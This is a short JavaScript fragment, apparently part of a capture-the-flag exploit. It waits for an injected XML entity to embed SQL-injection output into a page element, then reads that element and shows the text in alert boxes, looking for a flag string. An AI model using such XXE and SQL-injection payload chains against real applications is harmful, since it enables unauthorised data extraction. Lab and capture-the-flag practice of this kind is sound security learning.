// Wait a moment for the entity to potentially resolve and embed its content
setTimeout(() => {
  try {
    const resultElement = document.getElementById('sqli_result');
    if (resultElement) {
      const flagData = resultElement.textContent || resultElement.innerText;
      alert('Data from SQLi (via XXE): ' + flagData);
      // You might add more specific checks here if needed
      if (flagData && flagData.includes('flag{')) { // Example flag format
         alert('FLAG LIKELY FOUND: ' + flagData);
      }
    } else {
      alert('Could not find result element.');
    }
  } catch (e) {
    alert('Error accessing result: ' + e.message);
  }
}, 1500); // Adjust delay as needed
